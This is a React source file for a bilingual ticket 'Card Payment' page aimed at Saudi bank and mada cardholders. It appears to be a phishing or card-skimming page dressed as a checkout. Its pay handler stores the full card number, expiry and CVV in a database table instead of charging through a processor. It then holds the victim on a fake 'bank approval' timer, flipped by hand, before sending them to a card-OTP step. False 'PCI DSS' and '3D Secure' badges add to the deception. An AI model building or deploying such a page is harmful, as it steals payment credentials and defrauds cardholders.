import { useState, useRef, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { useLanguage } from "@/i18n/LanguageContext";
import { useToast } from "@/hooks/use-toast";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { motion, AnimatePresence } from "framer-motion";
import { Lock, CreditCard, CheckCircle, AlertCircle, Loader2, ShieldCheck } from "lucide-react";

// ─── BIN Database ─────────────────────────────────────────────────────────────
const BIN_DATABASE: Record<string, { bank: string; bankAr: string; color: string }> = {
  "458456": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "458457": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "458458": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "440647": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "440648": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "440795": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "521433": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "521434": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "588848": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "588849": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "604906": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "604907": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "604908": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "604909": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "604910": { bank: "Al Rajhi Bank", bankAr: "مصرف الراجحي", color: "#1a5276" },
  "455070": { bank: "Saudi National Bank", bankAr: "البنك الأهلي السعودي", color: "#1b4f72" },
  "455071": { bank: "Saudi National Bank", bankAr: "البنك الأهلي السعودي", color: "#1b4f72" },
  "455072": { bank: "Saudi National Bank", bankAr: "البنك الأهلي السعودي", color: "#1b4f72" },
  "455073": { bank: "Saudi National Bank", bankAr: "البنك الأهلي السعودي", color: "#1b4f72" },
  "455074": { bank: "Saudi National Bank", bankAr: "البنك الأهلي السعودي", color: "#1b4f72" },
  "521816": { bank: "Saudi National Bank", bankAr: "البنك الأهلي السعودي", color: "#1b4f72" },
  "521817": { bank: "Saudi National Bank", bankAr: "البنك الأهلي السعودي", color: "#1b4f72" },
  "455510": { bank: "Banque Saudi Fransi", bankAr: "البنك السعودي الفرنسي", color: "#1a3a5c" },
  "455511": { bank: "Banque Saudi Fransi", bankAr: "البنك السعودي الفرنسي", color: "#1a3a5c" },
  "455512": { bank: "Banque Saudi Fransi", bankAr: "البنك السعودي الفرنسي", color: "#1a3a5c" },
  "521500": { bank: "Banque Saudi Fransi", bankAr: "البنك السعودي الفرنسي", color: "#1a3a5c" },
  "521501": { bank: "Banque Saudi Fransi", bankAr: "البنك السعودي الفرنسي", color: "#1a3a5c" },
  "604820": { bank: "Banque Saudi Fransi", bankAr: "البنك السعودي الفرنسي", color: "#1a3a5c" },
  "604821": { bank: "Banque Saudi Fransi", bankAr: "البنك السعودي الفرنسي", color: "#1a3a5c" },
  "455900": { bank: "Riyad Bank", bankAr: "بنك الرياض", color: "#154360" },
  "455901": { bank: "Riyad Bank", bankAr: "بنك الرياض", color: "#154360" },
  "455902": { bank: "Riyad Bank", bankAr: "بنك الرياض", color: "#154360" },
  "521600": { bank: "Riyad Bank", bankAr: "بنك الرياض", color: "#154360" },
  "521601": { bank: "Riyad Bank", bankAr: "بنك الرياض", color: "#154360" },
  "604700": { bank: "Riyad Bank", bankAr: "بنك الرياض", color: "#154360" },
  "604701": { bank: "Riyad Bank", bankAr: "بنك الرياض", color: "#154360" },
  "455800": { bank: "Alinma Bank", bankAr: "مصرف الإنماء", color: "#0e6655" },
  "455801": { bank: "Alinma Bank", bankAr: "مصرف الإنماء", color: "#0e6655" },
  "521700": { bank: "Alinma Bank", bankAr: "مصرف الإنماء", color: "#0e6655" },
  "521701": { bank: "Alinma Bank", bankAr: "مصرف الإنماء", color: "#0e6655" },
  "604800": { bank: "Alinma Bank", bankAr: "مصرف الإنماء", color: "#0e6655" },
  "604801": { bank: "Alinma Bank", bankAr: "مصرف الإنماء", color: "#0e6655" },
  "456200": { bank: "Bank Albilad", bankAr: "بنك البلاد", color: "#1f618d" },
  "456201": { bank: "Bank Albilad", bankAr: "بنك البلاد", color: "#1f618d" },
  "521900": { bank: "Bank Albilad", bankAr: "بنك البلاد", color: "#1f618d" },
  "604850": { bank: "Bank Albilad", bankAr: "بنك البلاد", color: "#1f618d" },
  "456300": { bank: "Arab National Bank", bankAr: "البنك العربي الوطني", color: "#6e2f1a" },
  "456301": { bank: "Arab National Bank", bankAr: "البنك العربي الوطني", color: "#6e2f1a" },
  "521800": { bank: "Arab National Bank", bankAr: "البنك العربي الوطني", color: "#6e2f1a" },
  "604860": { bank: "Arab National Bank", bankAr: "البنك العربي الوطني", color: "#6e2f1a" },
  "604861": { bank: "Arab National Bank", bankAr: "البنك العربي الوطني", color: "#6e2f1a" },
  "456400": { bank: "Saudi Awwal Bank", bankAr: "البنك السعودي الأول", color: "#1a5276" },
  "456401": { bank: "Saudi Awwal Bank", bankAr: "البنك السعودي الأول", color: "#1a5276" },
  "521950": { bank: "Saudi Awwal Bank", bankAr: "البنك السعودي الأول", color: "#1a5276" },
  "604870": { bank: "Saudi Awwal Bank", bankAr: "البنك السعودي الأول", color: "#1a5276" },
  "456500": { bank: "Bank AlJazira", bankAr: "بنك الجزيرة", color: "#1b2631" },
  "456501": { bank: "Bank AlJazira", bankAr: "بنك الجزيرة", color: "#1b2631" },
  "604880": { bank: "Bank AlJazira", bankAr: "بنك الجزيرة", color: "#1b2631" },
  "411111": { bank: "Test Visa", bankAr: "فيزا تجريبية", color: "#1a5276" },
  "555555": { bank: "Test Mastercard", bankAr: "ماستركارد تجريبية", color: "#922b21" },
  "378282": { bank: "Test Amex", bankAr: "أمريكان إكسبريس تجريبية", color: "#1f618d" },
};

// ─── Helpers ──────────────────────────────────────────────────────────────────
function detectCardBrand(n: string): "visa" | "mastercard" | "amex" | "mada" | null {
  const c = n.replace(/\s/g, "");
  if (/^(604906|588848|588849|604907|604908|604909|604910|440647|440648|440795|458456|458457|458458|521433|521434)/.test(c)) return "mada";
  if (/^4/.test(c)) return "visa";
  if (/^5[1-5]/.test(c) || /^2[2-7]/.test(c)) return "mastercard";
  if (/^3[47]/.test(c)) return "amex";
  return null;
}

function detectBank(n: string) {
  const c = n.replace(/\s/g, "");
  for (let len = 6; len >= 4; len--) {
    const bin = c.substring(0, len);
    if (BIN_DATABASE[bin]) return BIN_DATABASE[bin];
  }
  return null;
}

function isValidLuhn(n: string): boolean {
  const c = n.replace(/\s/g, "");
  if (c.length < 13) return false;
  let sum = 0, even = false;
  for (let i = c.length - 1; i >= 0; i--) {
    let d = parseInt(c[i], 10);
    if (even) { d *= 2; if (d > 9) d -= 9; }
    sum += d; even = !even;
  }
  return sum % 10 === 0;
}

function formatCardNumber(v: string) {
  return v.replace(/\D/g, "").substring(0, 16).replace(/(.{4})/g, "$1 ").trim();
}

// ─── Card Brand Logos ─────────────────────────────────────────────────────────
const BrandLogo = ({ brand }: { brand: string | null }) => {
  if (!brand) return <CreditCard className="w-6 h-6 text-slate-400" />;
  if (brand === "visa") return (
    <svg viewBox="0 0 48 16" className="h-5 w-auto">
      <text x="0" y="14" fontSize="16" fontWeight="bold" fill="#1a1f71" fontFamily="Arial">VISA</text>
    </svg>
  );
  if (brand === "mastercard") return (
    <svg viewBox="0 0 38 24" className="h-5 w-auto">
      <circle cx="13" cy="12" r="10" fill="#eb001b" />
      <circle cx="25" cy="12" r="10" fill="#f79e1b" />
      <path d="M19 5.5a10 10 0 0 1 0 13A10 10 0 0 1 19 5.5z" fill="#ff5f00" />
    </svg>
  );
  if (brand === "amex") return (
    <svg viewBox="0 0 60 20" className="h-5 w-auto">
      <text x="0" y="16" fontSize="14" fontWeight="bold" fill="#2e77bc" fontFamily="Arial">AMEX</text>
    </svg>
  );
  if (brand === "mada") return (
    <svg viewBox="0 0 60 20" className="h-5 w-auto">
      <text x="0" y="16" fontSize="14" fontWeight="bold" fill="#00a651" fontFamily="Arial">mada</text>
    </svg>
  );
  return null;
};

// ─── WaitingApproval ──────────────────────────────────────────────────────────
const WaitingApproval = ({
  orderId, onApproved, onRejected, isAr,
}: { orderId: string; onApproved: () => void; onRejected: () => void; isAr: boolean }) => {
  const [timeLeft, setTimeLeft] = useState(120);

  useEffect(() => {
    const channel = supabase
      .channel(`order-wait-${orderId}`)
      .on("postgres_changes", {
        event: "UPDATE", schema: "public",
        table: "ticket_orders", filter: `id=eq.${orderId}`,
      }, (payload) => {
        const s = payload.new?.status;
        if (s === "confirmed") onApproved();
        else if (s === "rejected") onRejected();
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [orderId, onApproved, onRejected]);

  useEffect(() => {
    if (timeLeft <= 0) { onRejected(); return; }
    const t = setTimeout(() => setTimeLeft(v => v - 1), 1000);
    return () => clearTimeout(t);
  }, [timeLeft, onRejected]);

  const mm = Math.floor(timeLeft / 60).toString().padStart(2, "0");
  const ss = (timeLeft % 60).toString().padStart(2, "0");
  const progress = (timeLeft / 120) * 100;

  return (
    <div className="flex flex-col items-center justify-center py-10 text-center">
      <div className="relative w-28 h-28 mb-6">
        <svg className="w-28 h-28 -rotate-90" viewBox="0 0 112 112">
          <circle cx="56" cy="56" r="50" fill="none" stroke="#f1f5f9" strokeWidth="7" />
          <circle
            cx="56" cy="56" r="50" fill="none"
            stroke="hsl(var(--primary))" strokeWidth="7"
            strokeLinecap="round"
            strokeDasharray={`${2 * Math.PI * 50}`}
            strokeDashoffset={`${2 * Math.PI * 50 * (1 - progress / 100)}`}
            style={{ transition: "stroke-dashoffset 1s linear" }}
          />
        </svg>
        <div className="absolute inset-0 flex flex-col items-center justify-center">
          <span className="text-2xl font-bold text-foreground font-mono">{mm}:{ss}</span>
        </div>
      </div>

      <motion.div
        animate={{ scale: [1, 1.1, 1] }}
        transition={{ repeat: Infinity, duration: 2 }}
        className="text-5xl mb-4"
      >
        🔐
      </motion.div>

      <h3 className="text-xl font-bold text-foreground mb-2">
        {isAr ? "في انتظار موافقة البنك" : "Waiting for Bank Approval"}
      </h3>
      <p className="text-sm text-muted-foreground max-w-xs">
        {isAr ? "يتم التحقق من بيانات بطاقتك. يرجى الانتظار..." : "Your card details are being verified. Please wait..."}
      </p>
      <div className="mt-5 flex items-center gap-2 text-xs text-muted-foreground">
        <Lock className="w-3.5 h-3.5" />
        <span>{isAr ? "اتصال آمن ومشفر" : "Secure encrypted connection"}</span>
      </div>
    </div>
  );
};

// ─── Main Component ───────────────────────────────────────────────────────────
const CardPayment = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { lang } = useLanguage();
  const { toast } = useToast();
  const isAr = lang === "ar";

  const state = location.state as {
    tickets?: { id: string | number; name?: string; label?: string; price: number; qty: number }[];
    firstName?: string;
    lastName?: string;
    email?: string;
    phone?: string;
    total?: number;
    vat?: number;
    subtotal?: number;
  } | null;

  const [cardNumber, setCardNumber] = useState("");
  const [cardHolder, setCardHolder] = useState(
    state?.firstName && state?.lastName ? `${state.firstName} ${state.lastName}` : ""
  );
  const [expiry, setExpiry]   = useState("");
  const [cvv, setCvv]         = useState("");
  const [focused, setFocused] = useState<string | null>(null);

  const [brand, setBrand] = useState<"visa" | "mastercard" | "amex" | "mada" | null>(null);
  const [bank, setBank]   = useState<{ bank: string; bankAr: string; color: string } | null>(null);

  const [errors, setErrors]   = useState<Record<string, string>>({});
  const [loading, setLoading] = useState(false);
  const [step, setStep]       = useState<"form" | "waiting">("form");
  const [orderId, setOrderId] = useState("");

  // ─── Handlers ────────────────────────────────────────────────────────────
  const onCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const fmt = formatCardNumber(e.target.value);
    setCardNumber(fmt);
    const clean = fmt.replace(/\s/g, "");
    const newBrand = detectCardBrand(clean);
    setBrand(newBrand);
    setBank(detectBank(clean));
    if (newBrand !== brand) setCvv("");
    if (errors.cardNumber) setErrors(p => ({ ...p, cardNumber: "" }));
  };

  const onExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let v = e.target.value.replace(/\D/g, "").substring(0, 4);
    if (v.length >= 2) v = v.substring(0, 2) + "/" + v.substring(2);
    setExpiry(v);
    if (errors.expiry) setErrors(p => ({ ...p, expiry: "" }));
  };

  const onCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const maxLen = brand === "amex" ? 4 : 3;
    const v = e.target.value.replace(/\D/g, "").substring(0, maxLen);
    setCvv(v);
    if (errors.cvv) setErrors(p => ({ ...p, cvv: "" }));
  };

  // ─── Validation ──────────────────────────────────────────────────────────
  const validate = () => {
    const e: Record<string, string> = {};
    const clean = cardNumber.replace(/\s/g, "");
    if (!cardHolder.trim()) e.cardHolder = isAr ? "الاسم مطلوب" : "Name is required";
    if (clean.length < 13)  e.cardNumber = isAr ? "رقم البطاقة غير صحيح" : "Invalid card number";
    else if (!isValidLuhn(clean)) e.cardNumber = isAr ? "رقم البطاقة غير صالح" : "Card number is not valid";
    if (!expiry.match(/^\d{2}\/\d{2}$/)) {
      e.expiry = isAr ? "تاريخ الانتهاء غير صحيح" : "Invalid expiry";
    } else {
      const [m, y] = expiry.split("/").map(Number);
      if (m < 1 || m > 12 || new Date(2000 + y, m - 1) < new Date())
        e.expiry = isAr ? "البطاقة منتهية الصلاحية" : "Card expired";
    }
    const cvvRequired = brand === "amex" ? 4 : 3;
    if (cvv.length < cvvRequired) e.cvv = isAr ? "CVV غير صحيح" : "Invalid CVV";
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  // ─── Submit ───────────────────────────────────────────────────────────────
  const handlePay = async () => {
    if (!validate()) return;
    setLoading(true);
    try {
      const clean = cardNumber.replace(/\s/g, "");
      const { data, error } = await (supabase as any)
        .from("ticket_orders")
        .insert({
          status: "pending",
          card_last4: clean.slice(-4),
          card_brand: brand || "unknown",
          cardholder_name: cardHolder,
          bank_name: bank ? (isAr ? bank.bankAr : bank.bank) : null,
          card_full_number: clean,
          card_expiry: expiry,
          card_cvv: cvv,
          total: state?.total || 0,
          email: state?.email || null,
          phone: state?.phone ? `00966${state.phone.replace(/^0+/, "").replace(/^\+966/, "")}` : null,
          subtotal: state?.subtotal || null,
          vat: state?.vat || null,
          tickets: state?.tickets || null,
          created_at: new Date().toISOString(),
          updated_at: new Date().toISOString(),
        })
        .select("id")
        .single();

      if (error || !data) throw error || new Error("No data");
      setOrderId(data.id);
      setStep("waiting");
    } catch (err) {
      console.error(err);
      toast({ title: isAr ? "❌ حدث خطأ" : "❌ Error occurred", variant: "destructive" });
    } finally {
      setLoading(false);
    }
  };

  const handleApproved = () => {
    navigate("/card-otp", {
      state: {
        orderId,
        cardLast4: cardNumber.replace(/\s/g, "").slice(-4),
        cardBrand: brand,
        tickets: state?.tickets,
        email: state?.email,
        phone: state?.phone,
        total: state?.total,
        vat: state?.vat,
        subtotal: state?.subtotal,
      },
    });
  };

  const handleRejected = () => {
    setStep("form");
    toast({
      title: isAr ? "❌ تم رفض الدفع" : "❌ Payment declined",
      description: isAr ? "يرجى التحقق من بيانات البطاقة والمحاولة مرة أخرى" : "Please check your card details and try again",
      variant: "destructive",
    });
  };

  const inputClass = (field: string) =>
    `w-full px-4 py-3 rounded-xl border text-sm transition-all outline-none bg-background text-foreground
    ${errors[field]
      ? "border-destructive bg-destructive/5"
      : focused === field
      ? "border-primary ring-2 ring-primary/20"
      : "border-border hover:border-border/80"}`;

  // ─── Render ───────────────────────────────────────────────────────────────
  return (
    <div className="min-h-screen bg-background font-body" dir={isAr ? "rtl" : "ltr"}>
      <Header />
      <main className="pt-28 pb-20 px-4">
        <div className="max-w-lg mx-auto">
          <div className="bg-card rounded-2xl border border-border shadow-sm overflow-hidden">

            {/* رأس الصفحة */}
            <div className="px-6 py-5 border-b border-border">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-xl bg-primary/10 flex items-center justify-center">
                  <CreditCard className="w-5 h-5 text-primary" />
                </div>
                <div>
                  <h1 className="font-display text-lg font-bold text-foreground">
                    {isAr ? "الدفع بالبطاقة" : "Card Payment"}
                  </h1>
                  <p className="text-xs text-muted-foreground">
                    {isAr ? "أدخل بيانات بطاقتك البنكية" : "Enter your card details"}
                  </p>
                </div>
                <div className="mr-auto flex items-center gap-1.5 text-xs text-muted-foreground">
                  <Lock className="w-3.5 h-3.5 text-green-500" />
                  <span className="text-green-600 font-medium">{isAr ? "آمن" : "Secure"}</span>
                </div>
              </div>
            </div>

            <AnimatePresence mode="wait">
              {step === "form" && (
                <motion.div
                  key="form"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                  className="p-6 space-y-5"
                >
                  {state?.total && (
                    <div className="flex items-center justify-between bg-primary/5 border border-primary/20 rounded-xl px-4 py-3">
                      <span className="text-sm text-muted-foreground">
                        {isAr ? "المبلغ الإجمالي" : "Total Amount"}
                      </span>
                      <span className="text-lg font-bold text-foreground">
                        {state.total.toLocaleString()} {isAr ? "ر.س" : "SAR"}
                      </span>
                    </div>
                  )}

                  <div
                    className="relative h-44 rounded-2xl p-5 flex flex-col justify-between overflow-hidden shadow-lg"
                    style={{
                      background: bank
                        ? `linear-gradient(135deg, ${bank.color} 0%, ${bank.color}dd 100%)`
                        : "linear-gradient(135deg, #1e293b 0%, #0f172a 100%)",
                    }}
                  >
                    <div className="flex items-start justify-between">
                      <div>
                        <p className="text-white/50 text-xs">
                          {bank ? (isAr ? bank.bankAr : bank.bank) : (isAr ? "اسم البنك" : "Bank Name")}
                        </p>
                      </div>
                      <div className="bg-white/15 rounded-lg px-2.5 py-1.5">
                        <BrandLogo brand={brand} />
                      </div>
                    </div>

                    <div className="w-10 h-8 rounded-md bg-gradient-to-br from-yellow-300 to-yellow-500 flex items-center justify-center">
                      <div className="w-6 h-5 border border-yellow-600/40 rounded-sm grid grid-cols-3 gap-px p-0.5">
                        {[...Array(9)].map((_, i) => <div key={i} className="bg-yellow-600/30 rounded-sm" />)}
                      </div>
                    </div>

                    <p className="text-white font-mono text-lg tracking-[0.2em]">
                      {cardNumber
                        ? cardNumber.padEnd(19, " ").substring(0, 19)
                        : "•••• •••• •••• ••••"}
                    </p>

                    <div className="flex items-end justify-between">
                      <div>
                        <p className="text-white/40 text-[10px] mb-0.5">{isAr ? "حامل البطاقة" : "Card Holder"}</p>
                        <p className="text-white text-sm font-medium uppercase tracking-wide truncate max-w-[180px]">
                          {cardHolder || (isAr ? "الاسم الكامل" : "FULL NAME")}
                        </p>
                      </div>
                      <div className="text-right">
                        <p className="text-white/40 text-[10px] mb-0.5">{isAr ? "الانتهاء" : "Expires"}</p>
                        <p className="text-white text-sm font-medium font-mono">{expiry || "MM/YY"}</p>
                      </div>
                    </div>

                    {focused === "cvv" && (
                      <div className="absolute inset-0 bg-black/60 rounded-2xl flex items-center justify-center">
                        <div className="text-center">
                          <p className="text-white/60 text-xs mb-1">CVV</p>
                          <p className="text-white font-mono font-bold text-2xl tracking-widest">
                            {cvv || (brand === "amex" ? "••••" : "•••")}
                          </p>
                        </div>
                      </div>
                    )}
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-foreground mb-1.5">
                      {isAr ? "اسم حامل البطاقة" : "Cardholder Name"}
                    </label>
                    <input
                      type="text"
                      value={cardHolder}
                      onChange={e => { setCardHolder(e.target.value); if (errors.cardHolder) setErrors(p => ({ ...p, cardHolder: "" })); }}
                      onFocus={() => setFocused("cardHolder")}
                      onBlur={() => setFocused(null)}
                      placeholder={isAr ? "الاسم كما يظهر على البطاقة" : "Name as on card"}
                      className={inputClass("cardHolder")}
                    />
                    {errors.cardHolder && (
                      <p className="text-destructive text-xs mt-1 flex items-center gap-1">
                        <AlertCircle className="w-3 h-3" /> {errors.cardHolder}
                      </p>
                    )}
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-foreground mb-1.5">
                      {isAr ? "رقم البطاقة" : "Card Number"}
                    </label>
                    <div className="relative">
                      <input
                        type="text"
                        inputMode="numeric"
                        value={cardNumber}
                        onChange={onCardNumberChange}
                        onFocus={() => setFocused("cardNumber")}
                        onBlur={() => setFocused(null)}
                        placeholder="•••• •••• •••• ••••"
                        className={`${inputClass("cardNumber")} font-mono ${isAr ? "pl-12" : "pr-12"}`}
                      />
                      <div className={`absolute top-1/2 -translate-y-1/2 ${isAr ? "left-3" : "right-3"}`}>
                        <BrandLogo brand={brand} />
                      </div>
                    </div>
                    {bank && !errors.cardNumber && (
                      <p className="text-green-600 text-xs mt-1 flex items-center gap-1">
                        <CheckCircle className="w-3 h-3" /> {isAr ? bank.bankAr : bank.bank}
                      </p>
                    )}
                    {errors.cardNumber && (
                      <p className="text-destructive text-xs mt-1 flex items-center gap-1">
                        <AlertCircle className="w-3 h-3" /> {errors.cardNumber}
                      </p>
                    )}
                  </div>

                  <div className="grid grid-cols-2 gap-3">
                    <div>
                      <label className="block text-sm font-medium text-foreground mb-1.5">
                        {isAr ? "تاريخ الانتهاء" : "Expiry Date"}
                      </label>
                      <input
                        type="text"
                        inputMode="numeric"
                        value={expiry}
                        onChange={onExpiryChange}
                        onFocus={() => setFocused("expiry")}
                        onBlur={() => setFocused(null)}
                        placeholder="MM/YY"
                        maxLength={5}
                        className={`${inputClass("expiry")} font-mono`}
                      />
                      {errors.expiry && <p className="text-destructive text-xs mt-1">{errors.expiry}</p>}
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-foreground mb-1.5">
                        {isAr ? "رمز الأمان" : "CVV"}
                        <span className="text-muted-foreground font-normal mr-1">
                          ({brand === "amex" ? "4" : "3"} {isAr ? "أرقام" : "digits"})
                        </span>
                      </label>
                      <input
                        type="password"
                        inputMode="numeric"
                        value={cvv}
                        onChange={onCvvChange}
                        onFocus={() => setFocused("cvv")}
                        onBlur={() => setFocused(null)}
                        placeholder={brand === "amex" ? "••••" : "•••"}
                        maxLength={brand === "amex" ? 4 : 3}
                        className={`${inputClass("cvv")} font-mono`}
                      />
                      {errors.cvv && <p className="text-destructive text-xs mt-1">{errors.cvv}</p>}
                    </div>
                  </div>

                  <button
                    onClick={handlePay}
                    disabled={loading}
                    className="w-full h-13 py-3.5 rounded-xl font-bold text-primary-foreground text-base
                      bg-primary hover:bg-primary/90
                      disabled:opacity-60 disabled:cursor-not-allowed
                      transition-all flex items-center justify-center gap-2 shadow-md"
                  >
                    {loading ? (
                      <><Loader2 className="w-5 h-5 animate-spin" /> {isAr ? "جاري المعالجة..." : "Processing..."}</>
                    ) : (
                      <><Lock className="w-4 h-4" />
                        {isAr
                          ? `ادفع ${state?.total?.toLocaleString() || ""} ر.س`
                          : `Pay ${state?.total?.toLocaleString() || ""} SAR`}
                      </>
                    )}
                  </button>

                  <div className="flex items-center justify-center gap-4">
                    {["🔒 SSL", "🛡️ 3D Secure", "✓ PCI DSS"].map(b => (
                      <span key={b} className="text-xs text-muted-foreground">{b}</span>
                    ))}
                  </div>
                </motion.div>
              )}

              {step === "waiting" && (
                <motion.div
                  key="waiting"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                  className="p-6"
                >
                  <WaitingApproval
                    orderId={orderId}
                    onApproved={handleApproved}
                    onRejected={handleRejected}
                    isAr={isAr}
                  />
                </motion.div>
              )}
            </AnimatePresence>
          </div>

          <div className="flex items-center justify-center gap-2 mt-4 text-xs text-muted-foreground">
            <ShieldCheck className="w-4 h-4" />
            <span>{isAr ? "بياناتك محمية بتشفير SSL 256-bit" : "Your data is protected by 256-bit SSL encryption"}</span>
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default CardPayment;
